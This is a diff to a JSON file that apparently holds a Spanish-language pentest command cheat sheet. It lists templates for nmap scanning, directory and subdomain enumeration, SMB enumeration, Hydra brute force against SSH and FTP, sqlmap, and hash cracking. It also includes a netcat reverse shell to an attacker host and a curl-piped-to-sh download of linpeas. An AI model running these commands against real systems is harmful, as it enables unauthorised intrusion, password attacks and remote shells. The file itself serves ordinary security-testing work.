@@ -1,27 +1,184 @@
 [
-  {
-    "name": "Nmap básico",
-    "category": "recon",
-    "command": "nmap -sV {RHOST}"
-  },
-  {
-    "name": "Nmap completo",
-    "category": "recon",
-    "command": "nmap -sC -sV -p- {RHOST}"
-  },
-  {
-    "name": "Gobuster",
-    "category": "web",
-    "command": "gobuster dir -u {TARGET_URL}"
-  },
-  {
-    "name": "WhatWeb",
-    "category": "web",
-    "command": "whatweb {TARGET_URL}"
-  },
-  {
-    "name": "Whois",
-    "category": "recon",
-    "command": "whois {DOMAIN}"
-  }
+    {
+        "title": "Nmap básico",
+        "command": "nmap -sV {RHOST}",
+        "tags": [
+            "recon",
+            "nmap"
+        ],
+        "description": "Escaneo de puertos con detección de versión"
+    },
+    {
+        "title": "Nmap todos los puertos",
+        "command": "nmap -p- -T4 {RHOST}",
+        "tags": [
+            "recon",
+            "nmap"
+        ],
+        "description": "Escaneo completo de los 65535 puertos"
+    },
+    {
+        "title": "Nmap scripts default",
+        "command": "nmap -sC -sV -oN nmap_full.txt {RHOST}",
+        "tags": [
+            "recon",
+            "nmap"
+        ],
+        "description": "Escaneo con scripts NSE por defecto y guardado de salida"
+    },
+    {
+        "title": "Nmap UDP top ports",
+        "command": "nmap -sU --top-ports 100 {RHOST}",
+        "tags": [
+            "recon",
+            "nmap",
+            "udp"
+        ],
+        "description": "Escaneo de los 100 puertos UDP más comunes"
+    },
+    {
+        "title": "Gobuster directorios",
+        "command": "gobuster dir -u http://{RHOST} -w /usr/share/wordlists/dirb/common.txt",
+        "tags": [
+            "recon",
+            "web",
+            "fuzzing"
+        ],
+        "description": "Enumeración de directorios y archivos web"
+    },
+    {
+        "title": "Gobuster subdominios",
+        "command": "gobuster dns -d {DOMAIN} -w /usr/share/wordlists/subdomains.txt",
+        "tags": [
+            "recon",
+            "dns",
+            "fuzzing"
+        ],
+        "description": "Enumeración de subdominios por fuerza bruta"
+    },
+    {
+        "title": "Whatweb fingerprint",
+        "command": "whatweb -a 3 http://{RHOST}",
+        "tags": [
+            "recon",
+            "web"
+        ],
+        "description": "Identificación de tecnologías usadas en el sitio web"
+    },
+    {
+        "title": "Nikto scan",
+        "command": "nikto -h http://{RHOST}",
+        "tags": [
+            "web",
+            "vuln-scan"
+        ],
+        "description": "Escaneo de vulnerabilidades comunes en servidores web"
+    },
+    {
+        "title": "SMB enum con enum4linux",
+        "command": "enum4linux -a {RHOST}",
+        "tags": [
+            "recon",
+            "smb"
+        ],
+        "description": "Enumeración de recursos compartidos SMB, usuarios y grupos"
+    },
+    {
+        "title": "SMB shares con smbclient",
+        "command": "smbclient -L //{RHOST}/ -N",
+        "tags": [
+            "smb"
+        ],
+        "description": "Listado de shares SMB sin autenticación"
+    },
+    {
+        "title": "Hydra SSH bruteforce",
+        "command": "hydra -l {USER} -P /usr/share/wordlists/rockyou.txt ssh://{RHOST}",
+        "tags": [
+            "bruteforce",
+            "ssh"
+        ],
+        "description": "Ataque de fuerza bruta contra SSH"
+    },
+    {
+        "title": "Hydra FTP bruteforce",
+        "command": "hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt ftp://{RHOST}",
+        "tags": [
+            "bruteforce",
+            "ftp"
+        ],
+        "description": "Ataque de fuerza bruta contra FTP"
+    },
+    {
+        "title": "SQLmap básico",
+        "command": "sqlmap -u \"http://{RHOST}/index.php?id=1\" --batch",
+        "tags": [
+            "web",
+            "sqlmap"
+        ],
+        "description": "Detección automática de inyección SQL en parámetro id"
+    },
+    {
+        "title": "SQLmap dump de base de datos",
+        "command": "sqlmap -u \"http://{RHOST}/index.php?id=1\" --dbs --batch",
+        "tags": [
+            "web",
+            "sqlmap"
+        ],
+        "description": "Enumeración de bases de datos accesibles"
+    },
+    {
+        "title": "Netcat listener",
+        "command": "nc -lvnp {LPORT}",
+        "tags": [
+            "shell",
+            "netcat"
+        ],
+        "description": "Levanta un listener para recibir una reverse shell"
+    },
+    {
+        "title": "Netcat reverse shell",
+        "command": "nc -e /bin/bash {LHOST} {LPORT}",
+        "tags": [
+            "shell",
+            "netcat"
+        ],
+        "description": "Envía una shell reversa al host atacante"
+    },
+    {
+        "title": "Linpeas",
+        "command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+        "tags": [
+            "privesc",
+            "linux"
+        ],
+        "description": "Script de enumeración para escalada de privilegios en Linux"
+    },
+    {
+        "title": "WinPEAS",
+        "command": "winPEASx64.exe > winpeas_output.txt",
+        "tags": [
+            "privesc",
+            "windows"
+        ],
+        "description": "Script de enumeración para escalada de privilegios en Windows"
+    },
+    {
+        "title": "John the Ripper crackeo hash",
+        "command": "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
+        "tags": [
+            "cracking",
+            "john"
+        ],
+        "description": "Crackeo de hashes usando diccionario"
+    },
+    {
+        "title": "Hashcat crackeo NTLM",
+        "command": "hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt",
+        "tags": [
+            "cracking",
+            "hashcat"
+        ],
+        "description": "Crackeo de hashes NTLM con GPU"
+    }
 ]
